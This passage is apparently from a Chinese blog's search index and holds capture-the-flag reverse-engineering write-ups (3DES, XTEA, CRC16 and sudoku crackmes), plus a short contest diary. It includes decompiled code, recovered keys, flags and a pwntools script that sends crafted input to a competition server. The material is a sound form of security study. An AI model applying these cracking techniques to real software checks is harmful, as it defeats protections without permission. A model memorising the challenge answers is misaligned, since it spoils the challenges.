前十位 1324229810 用来过验证的passwd：13242298100123456789abcdef 后面这个加密函数是好像藏在data区里面的，看起来应该是一个加密算法，谷歌了几个比较关键的常数，发现是个3des加密 https://www.cnblogs.com/one--way/archive/2016/07/05/5643771.html 密钥应该是这个 AFSAFCEDYCXCXACNDFKDCQXC 再配上解密后的密文（实际上只用到了16个字节，剩下的8个字节可要可不要） 注意：大端序，不能直接复制，要先把顺序颠倒一下 轮子不太完整，修改了一下，以下是main函数中修改过的内容 char k[32] = \"AFSAFCEDYCXCXACNDFKDCQXC\"; char data[128] = &#123; 0x50,0x7C,0xA9,0xE6, 0x87,0x09,0xCE,0xFA, 0x20,0xD5,0x0D,0xCF, 0x90,0xBB,0x97,0x6C,0 &#125;; /* 原始明文 */ nlen = strlen(data);..... for (i = 0; i &lt; len; i += 8) &#123; DES_ecb3_encrypt((const_DES_cblock *)(src + i), (DES_cblock *)(out + i), &amp;ks1, &amp;ks2, &amp;ks3, DES_DECRYPT); &#125; printf(\"encrypted Hex:\"); for (i = 0; i &lt; len; i++) &#123; printf(\"%02X\" , *(out + i)); &#125; printf(\"\\n\"); printf(\"encrypted Bin:\"); for (i = 0; i &lt; len; i++) &#123; printf(\"%c\", *(out + i)); &#125; printf(\"\\n\");","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"qwb_ctf20190526","slug":"write-up/qwb-ctf20190526","permalink":"https://mrh1s.top/categories/write-up/qwb-ctf20190526/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"3des","slug":"3des","permalink":"https://mrh1s.top/tags/3des/"}],"author":"mrh929"},{"title":"rctf_babyre2","slug":"rctf-babyre2","date":"2019-05-21T12:29:34.000Z","updated":"2019-05-21T12:51:36.686Z","comments":true,"path":"posts/8b232dcf/","link":"","permalink":"https://mrh1s.top/posts/8b232dcf/","excerpt":"","text":"Rctf_babyre2rctf_babyre2 思路alarm 程序一开头就有一个alarm函数，这会使我们在调试的时候中途退出，直接把call alarm nop掉即可 sub_55761565891A__int64 __fastcall sub_55761565891A(void *a1)&#123; unsigned int v2; // [rsp+10h] [rbp-10h] signed int v3; // [rsp+14h] [rbp-Ch] v2 = 0; print_notice(); memset(a1, 0, 0x100uLL); read(0, a1, 0xFFuLL); v3 = strlen((const char *)a1); if ( v3 &lt;= 16 ) &#123; if ( v3 &gt; 7 ) v2 = 1; else print_notice(); &#125; else &#123; print_notice(); &#125; return v2;&#125; sub_5576156589CC__int64 __fastcall sub_5576156589CC(void *a1)&#123; unsigned int v2; // [rsp+1Ch] [rbp-14h] signed int i; // [rsp+20h] [rbp-10h] signed int v4; // [rsp+24h] [rbp-Ch] v2 = 0; print_notice(); memset(a1, 0, 0x100uLL); read(0, a1, 0xFFuLL); v4 = strlen((const char *)a1); if ( v4 &lt;= 16 ) &#123; if ( v4 &gt; 7 ) &#123; v2 = 1; for ( i = 0; i &lt; v4; ++i ) &#123; if ( *((_BYTE *)a1 + i) &lt;= 9 || *((_BYTE *)a1 + i) &gt; 99 ) &#123; print_notice(); return 0; &#125; &#125; &#125; else &#123; print_notice(); &#125; &#125; else &#123; print_notice(); &#125; return v2;&#125; 简单的读入账户和密码，不赘述 不赘述就出问题了 读密码的时候你没发现一个奇怪的事情吗？ if ( *((_BYTE *)a1 + i) &lt;= 9 || *((_BYTE *)a1 + i) &gt; 99 ) 密码可以不是可见字符 sub_557615658ACEchar *__fastcall sub_557615658ACE(__int64 a1, __int64 a2)&#123; __int64 v2; // rdx int i; // [rsp+10h] [rbp-40h] __int64 v5; // [rsp+14h] [rbp-3Ch] __int64 dest; // [rsp+20h] [rbp-30h] __int64 v7; // [rsp+28h] [rbp-28h] char v8; // [rsp+30h] [rbp-20h] char v9; // [rsp+31h] [rbp-1Fh] char v10; // [rsp+32h] [rbp-1Eh] char v11; // [rsp+33h] [rbp-1Dh] char v12; // [rsp+34h] [rbp-1Ch] char v13; // [rsp+35h] [rbp-1Bh] char v14; // [rsp+36h] [rbp-1Ah] char v15; // [rsp+37h] [rbp-19h] char v16; // [rsp+38h] [rbp-18h] char v17; // [rsp+39h] [rbp-17h] char v18; // [rsp+3Ah] [rbp-16h] char v19; // [rsp+3Bh] [rbp-15h] char v20; // [rsp+3Ch] [rbp-14h] char v21; // [rsp+3Dh] [rbp-13h] char v22; // [rsp+3Eh] [rbp-12h] char v23; // [rsp+3Fh] [rbp-11h] char v24; // [rsp+40h] [rbp-10h] unsigned __int64 v25; // [rsp+48h] [rbp-8h] v25 = __readfsqword(0x28u); v8 = -8; v9 = -44; v10 = -43; v11 = -36; v12 = -55; v13 = -38; v14 = -49; v15 = -50; v16 = -41; v17 = -38; v18 = -49; v19 = -46; v20 = -44; v21 = -43; v22 = -56; v23 = -102; v24 = -79; dest = 0LL; v7 = 0LL; v5 = (unsigned int)strlen((const char *)a1); if ( (signed int)v5 &lt;= 16 ) &#123; memcpy(&amp;dest, (const void *)a1, (signed int)v5);// 复制内存 for ( i = 0; 16 - (signed int)v5 &gt; i; ++i ) *((_BYTE *)&amp;dest + i + (signed int)v5) = i + 1;// 对于没有满16位的account 自动补全16位(补全一个从0开始的递增序列) &#125; else &#123; v2 = *(_QWORD *)(a1 + 8); dest = *(_QWORD *)a1; v7 = v2; &#125; return sub_55761565981E(&amp;v8, 17, (__int64)&amp;dest, 16, (int *)a2);&#125; char *__fastcall sub_55761565981E(const void *buf, int a2, __int64 a1, int a4, int *a5)&#123; int *v6; // [rsp+0h] [rbp-40h] __int64 acc; // [rsp+8h] [rbp-38h] signed int v8; // [rsp+24h] [rbp-1Ch] int v9; // [rsp+28h] [rbp-18h] char *dest; // [rsp+30h] [rbp-10h] acc = a1; v6 = a5; dest = 0LL; v8 = 0; if ( buf ) &#123; if ( a2 &gt; 0 ) &#123; if ( a1 ) &#123; if ( a4 == 16 ) &#123; if ( a5 ) &#123; *a5 = 0; v9 = 4 * (a2 / 4 + 1); dest = (char *)malloc(v9 + 1); if ( dest ) &#123; memcpy(dest, buf, a2); memset(&amp;dest[a2], 4 - a2 % 4, 4 - a2 % 4);// 填充了3 dest[v9] = 0; xtea((unsigned int *)dest, v9 / 4, acc);// 这里是执行了加密的过程,account作为密钥 *v6 = v9; v8 = 1; &#125; &#125; &#125; &#125; &#125; &#125; if ( !v8 ) &#123; if ( dest ) &#123; free(dest); dest = 0LL; &#125; if ( v6 ) *v6 = 0; &#125; return dest;&#125; 简单来说就是利用xtea算法，将buf（上面的数组）加密了，密钥是账户名 sub_557615658C02__int64 __fastcall sub_557615658C02(__int64 a1)&#123; signed int v2; // [rsp+14h] [rbp-81Ch] int v3; // [rsp+18h] [rbp-818h] unsigned int v4; // [rsp+18h] [rbp-818h] int i; // [rsp+1Ch] [rbp-814h] char buf[2048]; // [rsp+20h] [rbp-810h] char v7; // [rsp+820h] [rbp-10h] unsigned __int64 v8; // [rsp+828h] [rbp-8h] v8 = __readfsqword(0x28u); memset(buf, 0, sizeof(buf)); v7 = 0; print_notice(); read(0, buf, 0x400uLL); v3 = strlen(buf); if ( v3 &amp; 1 || v3 &gt; 1024 ) // 长度不超过1024,且必须为偶数 &#123; v4 = 0; print_notice(); &#125; else &#123; v2 = 1; for ( i = 0; i &lt; v3; ++i ) // 检测输入是否合规 &#123; if ( (buf[i] &lt;= 47 || buf[i] &gt; 57) &amp;&amp; (buf[i] &lt;= 96 || buf[i] &gt; 102) &amp;&amp; (buf[i] &lt;= 64 || buf[i] &gt; 70) )// 只准输入数字，大小写的字母a~f &#123; print_notice(); v2 = 0; break; &#125; &#125; if ( v2 ) // 如果输入合规 v4 = sub_5576156587C6(buf, v3, (_QWORD *)a1); else v4 = 0; &#125; return v4;&#125; 读入了偶数个字节的数据，并且长度不超过1024，数据只能在09 af A~F的范围 sub_557615658DD6_BYTE *__fastcall sub_557615658DD6(const char *passwd, __int64 data, int chunk, _DWORD *a4)&#123; _DWORD *v5; // [rsp+0h] [rbp-50h] int v6; // [rsp+Ch] [rbp-44h] signed int v7; // [rsp+2Ch] [rbp-24h] signed int v8; // [rsp+30h] [rbp-20h] int i; // [rsp+34h] [rbp-1Ch] int v10; // [rsp+38h] [rbp-18h] int v11; // [rsp+3Ch] [rbp-14h] _BYTE *ptr; // [rsp+40h] [rbp-10h] v6 = chunk; v5 = a4; v7 = 0; ptr = 0LL; if ( data ) &#123; if ( chunk &gt; 0 ) &#123; if ( passwd ) &#123; v10 = strlen(passwd); if ( v10 &gt; 0 ) &#123; ptr = malloc(v10 + 1); if ( ptr ) &#123; ptr[v10] = 0; v8 = 1; for ( i = 0; i &lt; v10; ++i ) &#123; v11 = passwd[i] - (passwd[i] % 10 + passwd[i] / 10);// 由passwd生成了一个偏移地址 if ( v11 &gt;= v6 ) &#123; v8 = 0; break; &#125; ptr[i] = *(_BYTE *)(v11 + data); // ptr[i]就等于这个偏移地址上面的数据 &#125; if ( v8 ) // 若正常退出 &#123; *v5 = v10; v7 = 1; &#125; &#125; &#125; &#125; &#125; &#125; if ( !v7 &amp;&amp; ptr ) &#123; free(ptr); ptr = 0LL; &#125; return ptr;&#125; 用passwd可以算出来一个偏移，对应着data中的数据，生成了一个ptr数组 sub_557615658FB0for ( j = 0; j &lt; passwd_len; ++j ) *((_BYTE *)&amp;dest + j) ^= 0xCCu; // ptr进行异或0xcc ::ptr = sub_5576156599B9(v6, v7, (__int64)&amp;dest, 16, &amp;dword_55761585B058); sub_5576156599B9: xtea((unsigned int *)dest, buf_len / -4, v7);// 这里执行解密的过程，解密encrypted，密钥为ptr_xor 公式 xtea(xtea(buf, accout, ENCRYPT) ,f(data,passwd) , DECRYPT) f(data, passwd) == accout passwd到data是一个很简单的映射，映射完之后要异或一个0xcc，异或结果应该刚好等于account solvescript from dalao https://balsn.tw/ctf_writeup/20190518-rctf2019/#babyre2 我自己还没用过pwntools。。。没想到要直接给程序传入非可见字符，所以就借用了一下国外大佬的脚本 from pwn import *r=remote(\"139.180.215.222\", 20000)print r.recvuntil(\"account\")r.send(\"a\"*16)print r.recvuntil(\"password\")r.send(\"\\x10\"*16)r.recvuntil(\"data\")r.send(\"010203040506070809ad0b0c0d0e0f\") #ad=61^ccr.shutdown(\"send\")r.interactive()","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"rctf-20190518","slug":"write-up/rctf-20190518","permalink":"https://mrh1s.top/categories/write-up/rctf-20190518/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"xtea","slug":"xtea","permalink":"https://mrh1s.top/tags/xtea/"},{"name":"pwntools","slug":"pwntools","permalink":"https://mrh1s.top/tags/pwntools/"}],"author":"mrh929"},{"title":"rctf_babyre1","slug":"rctf-babyre1","date":"2019-05-20T16:49:39.000Z","updated":"2019-05-21T12:51:31.761Z","comments":true,"path":"posts/122a7c75/","link":"","permalink":"https://mrh1s.top/posts/122a7c75/","excerpt":"","text":"RCTF_babyre1rctf_babyre1 思路以下是与输入相关的指令 main__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; unsigned __int64 *in; // rdx int v4; // ecx unsigned int v5; // eax unsigned __int64 v6; // rdx int v7; // eax int *v8; // rax char *v9; // rbx __int64 i; // rax int v12; // [rsp+4h] [rbp-124h] void *ptr; // [rsp+8h] [rbp-120h] unsigned __int64 str; // [rsp+10h] [rbp-118h] unsigned __int64 v15; // [rsp+118h] [rbp-10h] v15 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); ptr = 0LL; v12 = 0; memset(&amp;str, 0, 0x100uLL); __printf_chk(1LL, \"Input right flag you can got 'Bingo!' :\"); __isoc99_scanf(\"%31s\", &amp;str); // 输入为16位 in = &amp;str; do &#123; v4 = *(_DWORD *)in; in = (unsigned __int64 *)((char *)in + 4); v5 = ~v4 &amp; (v4 - 0x1010101) &amp; 0x80808080; &#125; while ( !v5 ); if ( !((unsigned __int16)~(_WORD)v4 &amp; (unsigned __int16)(v4 - 0x101) &amp; 0x8080) ) v5 &gt;&gt;= 16; if ( !((unsigned __int16)~(_WORD)v4 &amp; (unsigned __int16)(v4 - 0x101) &amp; 0x8080) ) in = (unsigned __int64 *)((char *)in + 2); v6 = (char *)in - __CFADD__((_BYTE)v5, (_BYTE)v5) - 3 - (char *)&amp;str; if ( v6 &gt; 0x10 ) &#123; puts(\"input is too long!\"); &#125; else if ( v6 == 16 ) &#123; v7 = change_into_number((unsigned __int64)&amp;str, 16, &amp;ptr);// 这个程序就是把输入的内容（十六进制）转换成了程序可读的数字 if ( v7 &amp;&amp; (v8 = xtea_keychanged(ptr, v7, (__int64)&amp;unk_55883B7B0010, 16, &amp;v12), (v9 = (char *)v8) != 0LL) &amp;&amp; v12 &gt; 0 &amp;&amp; (unsigned __int16)crc16((__int64)v8, v12) == 0x69E2 ) &#123; for ( i = 0LL; v12 &gt; (signed int)i; ++i ) v9[i] ^= 0x17u; puts(v9); if ( ptr ) free(ptr); free(v9); &#125; else &#123; puts(\"input flag is wrong!\"); &#125; &#125; else &#123; puts(\"input is too short!\"); &#125; return 0LL;&#125; 可以看到输入后的字符串进行了一大堆看不懂的操作，但是能推测出来输入的长度为16位 用ida调试可知，change_into_number这个函数把输入的字符串进行了转换 完成了16进制字符串 -&gt; 16进制整数的过程 xtea_keychanged中的一个子函数signed __int64 __fastcall sub_55883B5AECE0(int *a1, signed int a2, __int64 a3)&#123; __int64 v3; // rbp signed int v4; // ebx unsigned int v5; // ecx int v6; // er12 int *v7; // r13 unsigned int v8; // er14 unsigned int v9; // ecx unsigned int v10; // er15 unsigned int v11; // ebx unsigned int v12; // er10 int *v13; // r9 int v14; // er8 unsigned int v15; // esi int v16; // eax unsigned __int8 v17; // dl unsigned int v18; // eax int *v19; // r10 unsigned int v20; // eax char v21; // dl unsigned int v22; // eax signed __int64 result; // rax int v24; // esi unsigned int v25; // er11 int *v26; // r13 int v27; // er14 unsigned int v28; // er12 unsigned int v29; // ebx int *v30; // r8 int v31; // esi unsigned int v32; // er9 unsigned int v33; // er10 unsigned int v34; // eax int v35; // ecx unsigned __int8 v36; // dl unsigned int v37; // eax int v38; // er15 int *v39; // r8 unsigned int v40; // er10 int v41; // eax bool v42; // zf signed int v43; // [rsp+0h] [rbp-40h] int *v44; // [rsp+0h] [rbp-40h] unsigned int v45; // [rsp+Ch] [rbp-34h] v3 = a3; v4 = a2; v5 = *a1; v43 = a2; if ( a2 &gt; 1 ) &#123; v6 = a2 - 1; v7 = &amp;a1[a2 - 1]; v8 = 0; v9 = *v7; v10 = ((a2 - 4) &amp; 0xFFFFFFFE) + 2; v45 = 0x9E3779B9 * (52 / a2) - 0x4AB325AA; do &#123; v8 -= 0x61C88647; v11 = v8 &gt;&gt; 2; if ( v43 &lt;= 3 ) &#123; v14 = 0; &#125; else &#123; v12 = *a1; v13 = a1; v14 = 0; do &#123; v15 = v13[1]; v13 += 2; v16 = (v9 ^ *(_DWORD *)(v3 + 4LL * (((unsigned __int8)v14 ^ (unsigned __int8)v11) &amp; 3))) + (v15 ^ v8); v17 = v14 + 1; v14 += 2; v18 = v12 + ((((v9 &gt;&gt; 5) ^ 4 * v15) + ((v15 &gt;&gt; 3) ^ 16 * v9)) ^ v16); v12 = *v13; *(v13 - 2) = v18; v9 = v15 + (((4 * v12 ^ (v18 &gt;&gt; 5)) + (16 * v18 ^ (v12 &gt;&gt; 3))) ^ ((v12 ^ v8) + (v18 ^ *(_DWORD *)(v3 + 4LL * (((unsigned __int8)v11 ^ v17) &amp; 3))))); *(v13 - 1) = v9; &#125; while ( v10 != v14 ); &#125; v19 = &amp;a1[v14]; do &#123; v20 = v19[1]; v21 = v11 ^ v14++; ++v19; v22 = *(v19 - 1) + (((v9 ^ *(_DWORD *)(v3 + 4LL * (v21 &amp; 3))) + (v20 ^ v8)) ^ ((16 * v9 ^ (v20 &gt;&gt; 3)) + ((v9 &gt;&gt; 5) ^ 4 * v20))); *(v19 - 1) = v22; v9 = v22; &#125; while ( v6 &gt; v14 ); v9 = *v7 + (((v22 ^ *(_DWORD *)(v3 + 4LL * (((unsigned __int8)v6 ^ (unsigned __int8)v11) &amp; 3))) + (*a1 ^ v8)) ^ ((4 * *a1 ^ (v22 &gt;&gt; 5)) + (16 * v22 ^ ((unsigned int)*a1 &gt;&gt; 3)))); *v7 = v9; &#125; while ( v8 != v45 ); return 0LL; &#125; result = 1LL; if ( a2 &lt; -1 ) &#123; v24 = -a2; v25 = -1640531527 * (52 / v24 + 6); if ( v25 ) &#123; v26 = &amp;a1[v24 - 1]; v27 = ~v4; v44 = &amp;a1[~v4]; v28 = ~v4 - 2 - ((~v4 - 3) &amp; 0xFFFFFFFE); do &#123; v29 = v25 &gt;&gt; 2; if ( v27 &lt;= 2 ) &#123; v31 = v27; &#125; else &#123; v30 = v44; v31 = v27; v32 = *v44; do &#123; v33 = *(v30 - 1); v30 -= 2; v34 = v32; v32 = *v30; v35 = ((v5 ^ v25) + (v33 ^ *(_DWORD *)(v3 + 4LL * (((unsigned __int8)v31 ^ (unsigned __int8)v29) &amp; 3)))) ^ ((4 * v5 ^ (v33 &gt;&gt; 5)) + ((v5 &gt;&gt; 3) ^ 16 * v33)); v36 = v31 - 1; v31 -= 2; v37 = v34 - v35; v38 = *v30; v30[2] = v37; v5 = v33 - (((16 * v38 ^ (v37 &gt;&gt; 3)) + ((v32 &gt;&gt; 5) ^ 4 * v37)) ^ ((v32 ^ *(_DWORD *)(v3 + 4LL * (((unsigned __int8)v29 ^ v36) &amp; 3))) + (v25 ^ v37))); v30[1] = v5; &#125; while ( v28 != v31 ); &#125; v39 = &amp;a1[v31]; do &#123; v40 = *(v39 - 1); --v39; v5 = v39[1] - (((v5 ^ v25) + (v40 ^ *(_DWORD *)(v3 + 4LL * (((unsigned __int8)v29 ^ (unsigned __int8)v31) &amp; 3)))) ^ (((v5 &gt;&gt; 3) ^ 16 * v40) + ((v40 &gt;&gt; 5) ^ 4 * v5))); v39[1] = v5; --v31; &#125; while ( v31 ); v41 = *a1 - (((((unsigned int)*v26 &gt;&gt; 5) ^ 4 * v5) + (16 * *v26 ^ (v5 &gt;&gt; 3))) ^ ((*(_DWORD *)(v3 + 4LL * (v29 &amp; 3)) ^ *v26) + (v25 ^ v5))); v42 = v25 == -1640531527; v25 += 1640531527; v5 = v41; *a1 = v41; &#125; while ( !v42 ); &#125; return 0LL; &#125; return result;&#125; 由0x9E3779B9可知，这是一个xtea加密（解密）算法 然后加解密所使用的常数有所改变，是内存中的16字节的数组 xtea(v8, -(v10 &gt;&gt; 2), constant) 这个 -(v10 &gt;&gt; 2)明显是一个负数，而xtea函数为负时，就是解密的过程 在调试时xtea_keychanged这个函数执行完后就直接报wrong 经高人指点，这个是xtea解密失败，程序判断这个密码解不出来，就直接报错了 xtea_keychangedint *__fastcall xtea_keychanged(void *src, int const_8, __int64 a3, int a4, int *a5)&#123; int *v5; // rbp int v6; // er12 __int64 constant; // r14 int *string; // rbx int *v9; // rax int v10; // esi signed int v11; // eax int v13; // er12 v5 = a5; if ( !src || (v6 = const_8, const_8 &lt;= 0) || (constant = a3) == 0 || a4 != 16 ) &#123; if ( !a5 ) goto LABEL_14; goto LABEL_13; &#125; string = 0LL; if ( a5 ) &#123; *a5 = 0; if ( !(const_8 &amp; 3) ) &#123; v9 = (int *)malloc(const_8 + 1); string = v9; if ( v9 ) &#123; memcpy(v9, src, const_8); // v9 存储了输入的16进制数 v10 = const_8 + 3; if ( v6 &gt;= 0 ) v10 = v6; xtea(string, -(v10 &gt;&gt; 2), constant); // xtea对输入的字符串进行解密 v11 = *((unsigned __int8 *)string + v6 - 1);// 取第八个字符 *((_BYTE *)string + v6) = 0; *v5 = v6; if ( v6 &gt; v11 &amp;&amp; v11 &lt;= 4 ) &#123; v13 = v6 - v11; // 8 - v11 *v5 = v13; *((_BYTE *)string + v13) = 0; // 把某一位置零了 return string; &#125; free(string); &#125; &#125;LABEL_13: *v5 = 0;LABEL_14: string = 0LL; &#125; return string;&#125; *((_BYTE *)string + v13) = 0; // 把某一位置零了 这句话很关键，把某一位截断了，而这一位只能是倒数第二位 crc16__int64 __fastcall sub_55883B5AF3D0(__int64 a1, int a2)&#123; __int64 v2; // r12 __int64 v3; // rbp __int16 v4; // ax __int16 v5; // ax __int16 v6; // dx __int16 v7; // ax __int16 v8; // dx __int16 v9; // ax __int16 v10; // dx __int16 v11; // ax unsigned __int8 v13; // [rsp+5h] [rbp-23h] unsigned __int16 v14; // [rsp+6h] [rbp-22h] unsigned __int64 v15; // [rsp+8h] [rbp-20h] v15 = __readfsqword(0x28u); v13 = 0; v14 = 0; if ( a2 ) &#123; v2 = a1; v3 = a1 + (unsigned int)(a2 - 1) + 1; do &#123; while ( 1 ) &#123; v13 = *(_BYTE *)(++v2 - 1); sub_55883B5AF270(&amp;v13, &amp;v13); v4 = v14 ^ (v13 &lt;&lt; 8); if ( ((v14 ^ (v13 &lt;&lt; 8)) &amp; 0x8000u) != 0 ) v5 = 2 * v4 ^ 0x1021; else v5 = 2 * v4; v6 = 2 * v5 ^ 0x1021; if ( v5 &gt;= 0 ) v6 = 2 * v5; v7 = 2 * v6 ^ 0x1021; if ( v6 &gt;= 0 ) v7 = 2 * v6; v8 = 2 * v7 ^ 0x1021; if ( v7 &gt;= 0 ) v8 = 2 * v7; v9 = 2 * v8 ^ 0x1021; if ( v8 &gt;= 0 ) v9 = 2 * v8; v10 = 2 * v9 ^ 0x1021; if ( v9 &gt;= 0 ) v10 = 2 * v9; v11 = 2 * v10 ^ 0x1021; if ( v10 &gt;= 0 ) v11 = 2 * v10; if ( v11 &lt; 0 ) break; v14 = 2 * v11; if ( v2 == v3 ) goto LABEL_19; &#125; v14 = 2 * v11 ^ 0x1021; &#125; while ( v2 != v3 ); &#125;LABEL_19: sub_55883B5AF2D0(&amp;v14, &amp;v14); return v14;&#125; 也是通过0x1021可知，这是一个crc16校验，校验码为0x1021 if ( v2 == v3 ) goto LABEL_19; 由这句话可知，v2会从起始字节一直遍历到v3处，那么a2就要构造得刚好把这些值覆盖，可知a2=6，所以解密后的那个数组的最后一个字节就是2 调试tips: 有效的加密字符串 4290cd6dc6ae54cc 解密后得0123456789abcd02 大致思路 程序读入16位的十六进制数，并转化为8字节 将数据进行xtea解密 同时这个自带加密函数，只需要把输入的参数取反，就是逆过程了 将解密后的数据进行crc16校验（校验码为0x1021），得到结果0x69E2 这个解密后的数组去异或0x17能得到”Bingo!” 字符串 solvedef crc16(data: bytes, poly=0x1021): ''' CRC-16-CCITT Algorithm ''' data = bytearray(data) crc = 0xFFFF for b in data: cur_byte = 0xFF &amp; b for _ in range(0, 8): if (crc &amp; 0x0001) ^ (cur_byte &amp; 0x0001): crc = (crc &gt;&gt; 1) ^ poly else: crc &gt;&gt;= 1 cur_byte &gt;&gt;= 1 crc = (~crc &amp; 0xFFFF) crc = (crc &lt;&lt; 8) | ((crc &gt;&gt; 8) &amp; 0xFF) return crc &amp; 0xFFFFenc = \"Bingo!\"dec = []for i in enc: dec.append(hex(ord(i) ^ 0x17))dec.append(hex(6))dec.append(hex(2))print(dec) 557e797078360602 然后再拿这个字符串去加密一遍，就得到flag了 rctf{2a2e71aab6168fb6} [11] Accepting connection from 192.168.133.1...Input right flag you can got 'Bingo!' :2a2e71aab6168fb6 Bingo! 后续：据说倒数第二字节是个padding 有空再填坑 https://blog.csdn.net/shift_wwx/article/details/84256774","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"rctf-20190518","slug":"write-up/rctf-20190518","permalink":"https://mrh1s.top/categories/write-up/rctf-20190518/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"xtea","slug":"xtea","permalink":"https://mrh1s.top/tags/xtea/"},{"name":"crc16","slug":"crc16","permalink":"https://mrh1s.top/tags/crc16/"}],"author":"mrh929"},{"title":"ccsp2019西南赛区","slug":"ccsp","date":"2019-05-18T16:29:53.000Z","updated":"2019-05-18T17:17:17.499Z","comments":true,"path":"posts/74b676c7/","link":"","permalink":"https://mrh1s.top/posts/74b676c7/","excerpt":"","text":"CCSP2019 有幸通过了CCF CSP 认证，获得了参加CCSP西南赛区比赛的资格 来到川大（江安校区） 这个校区管理非常严格，进门之前甚至需要出示身份证和准考证( x 校园中一片宁静，可能是因为星期六的原因，并没有太多人愿意在这个搭好的天气出来走动走动，偶尔看见一两对情侣唧唧我我，酸死我了 人文气息极其浓厚 这个比赛并不是很出名，整个教学楼就只看到两个指示牌，这是其中一个（ CCSP分区赛是第一次在川大举办的，看出来主办方对于应急事件的处理方法还不够了解，试机过程中状况百出 8:30上机调试，没有提供windows的IDE，仅仅有一个linux虚拟机，配上里面“丰富”的IDE，不过我并不觉得这是一个好办法，因为川大的电脑实在是太垃圾了。。虚拟机真的是带不动啊 幸好我带了U盘，装上了Dev-Cpp 经过无数次重启，好不容易进去了比赛界面 OJ是清华大学提供的，这个非常好 比赛期间还算进行得很顺利，不过嘛，菜是原罪 第一题是图论题，并不是什么高大上的题目，题目叙述非常简单，就是靠自己爆搜，剪枝吧 第二题模拟题，模拟raid5阵列恢复数据的过程 第三题是一道看不懂的与c++的类有关的题目，，，但是题目给的样例程序，交上去居然有分 中午12:30有午餐，是德克士的汉堡跟鸡腿，主办方在给选手提供良好比赛环境上还是下了很大功夫的 图片：颁奖现场 水了个铜奖 奖励是罗技鼠标一个 总结：这次川大之行非常愉快，一方面是见了见老同学聊了聊往事，另一方面我看到了川大在准备比赛上的用心和负责，虽然自己的水平还不够继续参加总决赛，不过这次区域赛无疑是一个很好的锻炼，期待以后的表现","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[],"author":"mrh929"},{"title":"single","slug":"single","date":"2019-05-14T05:44:02.000Z","updated":"2019-05-21T07:55:13.929Z","comments":true,"path":"posts/caa72719/","link":"","permalink":"https://mrh1s.top/posts/caa72719/","excerpt":"","text":"singlesingle 思路 经观察 发现a1是一个矩阵 sub_400833unsigned __int64 __fastcall sub_400833(__int64 a1)&#123; signed int i; // [rsp+18h] [rbp-28h] signed int j; // [rsp+1Ch] [rbp-24h] signed int k; // [rsp+1Ch] [rbp-24h] char s[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v6; // [rsp+38h] [rbp-8h] v6 = __readfsqword(0x28u); for ( i = 0; i &lt;= 8; ++i ) &#123; memset(s, 0, 0xAuLL); for ( j = 0; j &lt;= 8; ++j ) ++s[*(unsigned __int8 *)(9 * i + j + a1)]; for ( k = 1; k &lt;= 9; ++k ) &#123; if ( s[k] != 1 ) sub_4006F6(); &#125; &#125; return __readfsqword(0x28u) ^ v6;&#125; 将a1矩阵的每一行所指向的地址加1 最后s[1] - s[9] 全部等于1 ​ sub_4008FEunsigned __int64 __fastcall sub_4008FE(__int64 a1)&#123; signed int i; // [rsp+18h] [rbp-28h] signed int j; // [rsp+1Ch] [rbp-24h] signed int k; // [rsp+1Ch] [rbp-24h] char s[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v6; // [rsp+38h] [rbp-8h] v6 = __readfsqword(0x28u); for ( i = 0; i &lt;= 8; ++i ) &#123; memset(s, 0, 0xAuLL); for ( j = 0; j &lt;= 8; ++j ) ++s[*(unsigned __int8 *)(9 * j + i + a1)]; for ( k = 1; k &lt;= 9; ++k ) &#123; if ( s[k] != 1 ) sub_4006F6(); &#125; &#125; return __readfsqword(0x28u) ^ v6;&#125; ​ 将a1矩阵的每一列所指向的地址加1 最后s[1] - s[9] 全部等于1 其实做完这一步的时候我就反应出来这道题可能是一个数独了，并且验证最后一个函数的功能，发现确实是一个数独 sub_4009C9unsigned __int64 __fastcall sub_4009C9(__int64 a1)&#123; signed int i; // [rsp+1Ch] [rbp-34h] int j; // [rsp+20h] [rbp-30h] signed int l; // [rsp+20h] [rbp-30h] int k; // [rsp+24h] [rbp-2Ch] signed int v6; // [rsp+28h] [rbp-28h] signed int v7; // [rsp+2Ch] [rbp-24h] char s[24]; // [rsp+30h] [rbp-20h] unsigned __int64 v9; // [rsp+48h] [rbp-8h] v9 = __readfsqword(0x28u); v6 = 3; v7 = 3; for ( i = 0; i &lt;= 8; ++i ) &#123; memset(s, 0, 0xAuLL); for ( j = v6 - 3; j &lt; v6; ++j ) &#123; for ( k = v7 - 3; k &lt; v7; ++k ) ++s[*(unsigned __int8 *)(9 * j + k + a1)]; &#125; for ( l = 1; l &lt;= 9; ++l ) &#123; if ( s[l] != 1 ) sub_4006F6(); &#125; if ( v7 == 9 ) &#123; v7 = 3; v6 += 3; &#125; else &#123; v7 += 3; &#125; &#125; return __readfsqword(0x28u) ^ v9;&#125; ​ 将a1矩阵分为九个正方形的小块 最后s[1] - s[9] 全部等于1 计算 程序先读入一个81位长的字符串 并且通过c -= ‘0’ 来转化为数字 如果数独的某个位置上面已经有数的话，就必须输入0 dumpaddr = 0x602080for i in range(81): print Byte(addr+i),\",\", if((i+1) % 9 == 0): print \"\" map0 , 3 , 0 , 6 , 0 , 0 , 0 , 0 , 0 , 6 , 0 , 0 , 0 , 3 , 2 , 4 , 9 , 0 , 0 , 9 , 0 , 1 , 0 , 7 , 0 , 6 , 0 , 7 , 4 , 6 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 8 , 0 , 0 , 0 , 6 , 3 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 4 , 7 , 0 , 8 , 0 , 9 , 0 , 4 , 0 , 7 , 0 , 0 , 7 , 4 , 2 , 1 , 0 , 0 , 0 , 6 , 0 , 0 